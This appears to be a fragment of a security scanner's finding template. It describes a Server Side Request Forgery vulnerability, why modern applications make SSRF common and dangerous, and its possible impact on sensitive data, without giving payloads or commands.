            "The endpoint appears to be vulnerable to Server Side Request Forgery attack. The original request was replayed by replacing the URI parameter with popular sensitive file paths. The application responded with 2XX success code and also gave out details of these files.
            Modern concepts in application development make SSRF more common and more dangerous.
            More common - the following concepts encourage developers to access an external resource based on user input: Webhooks, file fetching from URLs, custom SSO, and URL previews.
            More dangerous - Modern technologies like cloud providers, Kubernetes, and Docker expose management and control channels over HTTP on predictable, well-known paths. Those channels are an easy target for an SSRF attack.
            It is also more challenging to limit outbound traffic from your application, because of the connected nature of modern applications.
            The SSRF risk can not always be completely eliminated. While choosing a protection mechanism, it is important to consider the business risks and needs."
  impact: "Successful exploitation might compromise sensitive data such as passwords, source-code, confidential files etc."
